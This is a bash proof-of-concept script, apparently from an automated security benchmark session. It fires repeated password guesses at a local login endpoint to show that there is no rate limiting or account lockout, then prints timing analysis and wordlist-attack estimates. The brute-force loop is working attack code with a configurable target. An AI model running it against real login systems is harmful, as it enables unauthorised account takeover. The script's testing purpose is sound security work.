#!/bin/bash
# POC: Comprehensive brute force password authentication POC demonstrating lack of rate limiting and account lockout
# Target: ./repo
# Created: 2025-11-04T20:04:33.883Z
# Session: benchmark-XBEN-027-24-mhkznijf

# Brute Force Protection Testing POC - Version 3
# Demonstrates lack of rate limiting on password authentication endpoint
# This POC makes rapid sequential password attempts and analyzes response patterns

TARGET_HOST="${1:-localhost:5000}"
USERNAME="${2:-test}"
NUM_ATTEMPTS="${3:-50}"

echo "[*] ========== Brute Force Password Authentication POC =========="
echo "[*] Target: http://$TARGET_HOST/password/$USERNAME"
echo "[*] Username: $USERNAME"
echo "[*] Attempts: $NUM_ATTEMPTS"
echo "[*] Starting test..."
echo ""

# Track metrics
declare -a http_codes
declare -a response_times
declare -a body_sizes
attempt=0
start_epoch=$(date +%s)

# Make rapid password attempts
echo "[*] Sending rapid password attempts..."
for i in $(seq 1 $NUM_ATTEMPTS); do
    attempt_time_start=$(date +%s%N)
    
    # Make POST request with different password each time
    output=$(curl -s -w "\n%{http_code}\n%{size_download}" -X POST \
        "http://$TARGET_HOST/password/$USERNAME" \
        -d "username=$USERNAME&user_id=1&password=password$i" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
    
    attempt_time_end=$(date +%s%N)
    
    # Parse output: body, then http_code, then size
    http_code=$(echo "$output" | tail -2 | head -1)
    body_size=$(echo "$output" | tail -1)
    response_time=$(( (attempt_time_end - attempt_time_start) / 1000000 ))
    
    http_codes+=("$http_code")
    response_times+=("$response_time")
    body_sizes+=("$body_size")
    
    attempt=$i
    
    # Show progress
    if [ $((i % 10)) -eq 0 ]; then
        printf "[+] Attempt %d: HTTP %s | Response: %dms | Body: %s bytes\n" "$i" "$http_code" "$response_time" "$body_size"
    fi
done

end_epoch=$(date +%s)
total_duration=$((end_epoch - start_epoch))

echo ""
echo "[*] ========== ANALYSIS RESULTS =========="
echo "[*] Test completed: $NUM_ATTEMPTS password attempts"
echo "[*] Duration: ${total_duration}s"

# Calculate request rate
if [ "$total_duration" -gt 0 ]; then
    rate=$((NUM_ATTEMPTS / total_duration))
    echo "[*] Request rate: ~$rate attempts/second"
fi

# Analyze HTTP response codes
echo ""
echo "[*] HTTP Response Codes:"
unique_codes=$(printf '%s\n' "${http_codes[@]}" | sort -u)
for code in $unique_codes; do
    count=$(printf '%s\n' "${http_codes[@]}" | grep -c "^$code$")
    percentage=$((count * 100 / NUM_ATTEMPTS))
    printf "    - HTTP %s: %d times (%d%%)\n" "$code" "$count" "$percentage"
done

# Analyze response times
echo ""
echo "[*] Response Time Statistics:"
min_time=$(printf '%s\n' "${response_times[@]}" | sort -n | head -1)
max_time=$(printf '%s\n' "${response_times[@]}" | sort -n | tail -1)
sum_time=0
for time in "${response_times[@]}"; do
    sum_time=$((sum_time + time))
done
avg_time=$((sum_time / NUM_ATTEMPTS))

echo "    - Min: ${min_time}ms"
echo "    - Max: ${max_time}ms"
echo "    - Avg: ${avg_time}ms"
echo "    - Range: $((max_time - min_time))ms"

# Analyze body sizes
echo ""
echo "[*] Response Body Sizes:"
unique_sizes=$(printf '%s\n' "${body_sizes[@]}" | sort -u)
for size in $unique_sizes; do
    count=$(printf '%s\n' "${body_sizes[@]}" | grep -c "^$size$")
    printf "    - %s bytes: %d times\n" "$size" "$count"
done

# Vulnerability Assessment
echo ""
echo "[*] ========== VULNERABILITY ASSESSMENT =========="

# Check 1: All responses identical (no account lockout)
first_code=${http_codes[0]}
all_same_code=true
for code in "${http_codes[@]}"; do
    if [ "$code" != "$first_code" ]; then
        all_same_code=false
        break
    fi
done

if [ "$all_same_code" = true ]; then
    echo "[!] FINDING: All $NUM_ATTEMPTS attempts received identical HTTP $first_code response"
    echo "    → NO ACCOUNT LOCKOUT MECHANISM DETECTED"
fi

# Check 2: Consistent response times (no backoff)
time_range=$((max_time - min_time))
if [ "$time_range" -lt 100 ]; then
    echo "[!] FINDING: Response times are consistent (${min_time}ms - ${max_time}ms, range: ${time_range}ms)"
    echo "    → NO EXPONENTIAL BACKOFF DETECTED"
fi

# Check 3: High request rate
if [ -n "$rate" ] && [ "$rate" -ge 10 ]; then
    echo "[!] FINDING: Requests processed at $rate+ attempts per second"
    echo "    → NO RATE LIMITING DETECTED"
fi

# Check 4: Check if response is even processing
if [ "$first_code" = "000" ]; then
    echo "[*] NOTE: Connection appears to be failing (HTTP 000)"
    echo "    Verify target is accessible at http://$TARGET_HOST/password/$USERNAME"
fi

echo ""
echo "[*] ========== EXPLOITATION IMPLICATIONS =========="
if [ "$all_same_code" = true ] && [ "$time_range" -lt 100 ] && [ -n "$rate" ] && [ "$rate" -ge 5 ]; then
    echo "[!] CONFIRMED VULNERABLE: This endpoint is susceptible to brute force attacks"
    echo ""
    echo "    Attack Feasibility:"
    echo "    - Request rate: $rate attempts/second"
    if [ "$rate" -ge 50 ]; then
        echo "    - At this rate: 50 password attempts = 1 second"
        echo "    - Common password list (1000 entries): ~20 seconds"
        echo "    - Larger wordlist (100k): ~33 minutes"
    fi
    echo ""
    echo "    RISK: HIGH - Attackers can systematically compromise user accounts"
else
    echo "[?] Result uncertain. Please verify:"
    echo "    - Target is running and accessible"
    echo "    - Endpoint path is correct: /password/$USERNAME"
    echo "    - POST parameter names are: username, user_id, password"
fi

echo ""
echo "[*] ========== POC EXECUTION COMPLETE =========="